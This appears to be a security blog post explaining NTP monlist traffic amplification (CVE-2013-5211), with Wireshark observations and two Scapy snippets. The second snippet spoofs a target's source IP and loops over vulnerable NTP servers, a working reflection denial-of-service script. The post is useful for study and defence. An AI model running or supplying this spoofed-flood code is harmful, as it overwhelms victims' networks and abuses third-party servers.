---
title: "A look at NTP Traffic Amplification (CVE-2013-5211)"
date: 2019-10-20
toc: true
toc_label: "Table of Contents"
categories:
  - blog
tags:
  - Network Security
  - NTP Amplification
  - Scapy
---

# Introduction
In a previous [post][dos], we had a look at some low-level DoS attacks. In this post, we will take a look at CVE-2013-5211, which uses vulnerable NTP servers to cause a DoS.

# NTP
The Network Time Protocol is a protocol designed to synchronize the clocks of computers over a network. This is the protocol that all your devices use to get the correct time for your timezone. 

In this post, we are concerned with the mode 7 packet, which is used for exchanging data between an NTP server and a client for purposes other than time synchronization, e.g., monitoring, statistics gathering, and configuration. It has the following format:

![NTP-Mode-7-Message-Format](../../assets/images/ntp-amplification/ntp_priv_format.png)

Some of the various request codes are:

1. REQ_PEER_LIST
2. REQ_PEER_STATS
3. REQ_CONFIG
4. REQ_MON_GETLIST_1 

# NTP Traffic Amplification
Of the various request codes, the ones I am interested in today is the *REQ_MON_GETLIST* or *REQ_MON_GETLIST_1*. 

Sending a request, with either of those codes, to a vulnerable NTP server will result in the server responding with the most recent interactions of it with the last 600 hosts. The responses include the IP addresses of hosts, source port used, NTP version, and the mode. 

This issue affects server versions before 4.2.7p26. To search for vulnerable servers, I looked up servers running ntpd 4.2.6 on shodan.

Now to test this, I have written the following python code, using the `NTPPrivate` class of scapy. 

```python
# Create the request
ip = IP(dst = ntp_ip)
udp = UDP(sport = RandShort(), dport = 123)
ntp = NTPPrivate(mode=7, implementation="XNTPD", request_code="REQ_MON_GETLIST_1")

# Send the request to the NTP server
packet = ip/udp/ntp
send(packet)
```

Running the above code and looking at the request and responses in Wireshark, we can see the following.

![requst-response-1](../../assets/images/ntp-amplification/req_resp_1.png)

There are two issues with this. The first being the information disclosure. Looking at one of the response, we can see the following details being disclosed. 

![requst-response-1](../../assets/images/ntp-amplification/disclosure.png)

The second issue is the size and number of returned packets. For one packet of length 50 sent by us, we received 27 packets, each of length 482. This is a clear amplification of the traffic. Attackers constantly look for such vulnerabilities while trying to DoS a target. 

To attack a target using this vulnerability, all the attacker has to do is send spoofed requests by changing the source IP address. All the responses are then sent to the target, which can overwhelm it. 

The above code can be modified in the following way to target hosts with an amplification attack.

```python
# Create the NTP request
ip = IP(src = g_target_ip)
udp = UDP(sport = RandShort(), dport = 123)
ntp = NTPPrivate(mode=7, implementation = "XNTPD", request_code="REQ_MON_GETLIST_1")

while True:
  # Send the request to each of the NTP servers
  for ntp_ip in g_ntp_servers:
    ip.dst = ntp_ip
    packet = ip/udp/ntp
    send(packet)
```

The code takes a list of vulnerable NTP servers, and continuously sends each one of them spoofed NTP requests. Now all the responses are received by the target instead of our machine.

That's it for this post. The entire script is available on my github [page][page].

# Disclaimer
The attacks mentioned on any of the posts on my website are to be tested at your own risk. Please do not use them without the permission of the target host. I will not be responsible for any damage caused by running them.  

[dos]: https://fsec404.github.io/blog/Introduction-to-a-few-network-attacks/
[page]: https://github.com/venkat-abhi/network-attacks/